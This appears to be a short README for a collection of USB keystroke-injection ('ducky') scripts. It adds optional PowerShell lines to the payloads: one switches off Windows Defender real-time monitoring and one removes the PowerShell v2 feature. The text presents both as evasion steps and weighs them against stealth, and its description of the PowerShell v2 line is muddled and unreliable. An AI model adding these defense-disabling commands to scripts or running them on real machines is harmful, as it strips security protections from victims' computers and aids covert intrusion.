# ducky_scripts
Random ducky scripts that have been pulled together.
--more to be added later.

Delays should be modified if you are running on a slow system or your payload is from a slow server
# optional
Add these to the script to disable powershell v2 engine protections and windows defender realtime protection, This is less stealthy since the user might be warned of windows defender being disabled.

Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root
Set-MpPreference -DisableRealtimeMonitoring $true
